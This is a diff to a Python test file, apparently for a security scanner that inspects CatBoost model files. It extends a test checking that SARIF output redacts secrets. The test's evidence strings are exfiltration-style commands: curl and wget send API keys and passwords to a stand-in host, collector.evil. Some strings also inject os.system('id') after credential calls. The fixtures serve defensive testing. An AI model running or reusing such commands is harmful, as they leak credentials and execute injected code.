@@ -2025,7 +2025,7 @@ def test_catboost_sarif_redacts_additional_serialized_and_argument_secrets(tmp_p
 
 
 def test_catboost_sarif_redacts_command_and_nested_url_follow_up_secrets(tmp_path: Path) -> None:
-    secrets = [f"followup-secret-{index}" for index in range(7)]
+    secrets = [f"followup-secret-{index}" for index in range(13)]
     evidence = [
         f"curl --url-query api_key={secrets[0]} https://collector.evil/upload",
         f"wget --post-data api_key={secrets[1]} https://collector.evil/upload",
@@ -2034,6 +2034,12 @@ def test_catboost_sarif_redacts_command_and_nested_url_follow_up_secrets(tmp_pat
         (f'https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2Fapi_key%3D{secrets[4]}; os.system("id")'),
         f'os.system("curl https://collector.evil/upload?api_" "key={secrets[5]}")',
         f'os.system("API_KEY={secrets[6]} curl https://collector.evil/upload")',
+        f'client.setApiKey("{secrets[7]}"); os.system("id")',
+        f'google_access_id={secrets[8]} os.system("id")',
+        f"curl --config <(echo 'user = alice:{secrets[9]}') https://collector.evil/upload",
+        f'setAuthorization("{secrets[10]}"); os.system("id")',
+        f'client.setCredentials("alice", "{secrets[11]}"); os.system("id")',
+        f'curl --user "alice:{secrets[12]} suffix" https://collector.evil/upload',
     ]
     model_path = tmp_path / "catboost_command_follow_up_redaction.cbm"
     model_path.write_bytes(_build_cbm(evidence))
